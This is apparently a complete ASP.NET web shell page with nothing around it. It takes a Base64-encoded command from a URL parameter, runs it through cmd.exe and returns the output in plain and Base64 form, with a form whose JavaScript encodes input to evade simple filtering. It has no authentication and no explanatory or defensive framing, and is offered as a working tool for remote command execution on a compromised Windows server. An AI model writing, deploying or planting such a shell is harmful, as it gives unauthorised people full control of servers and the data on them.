<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmdBase64 = Request["cmd"];
    if (!string.IsNullOrEmpty(cmdBase64))
    {
        try
        {
            // Decode Base64 command
            string command = Encoding.UTF8.GetString(Convert.FromBase64String(cmdBase64));

            // Execute command via cmd.exe
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process proc = Process.Start(psi);
            string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            // Encode output to Base64
            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));

            Response.Write("<b>Base64 Output:</b><br/>" + outputBase64 + "<br/><br/>");
            Response.Write("<b>Decoded Output:</b><br/>" + output);
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
    }
}
</script>

<html>
<body>
<form id="cmdForm" method="get" onsubmit="encodeCmd(); return false;">
    Command: <br/>
    <input type="text" id="cmdInput" name="cmdInput" style="width:400px;" />
    <input type="submit" value="Execute" />
</form>

<script>
function encodeCmd() {
    var input = document.getElementById('cmdInput').value;
    // Encode to Base64
    var encoded = btoa(input);
    // Redirect to same page with Base64 param
    window.location.href = "?cmd=" + encodeURIComponent(encoded);
}
</script>
</body>
</html>
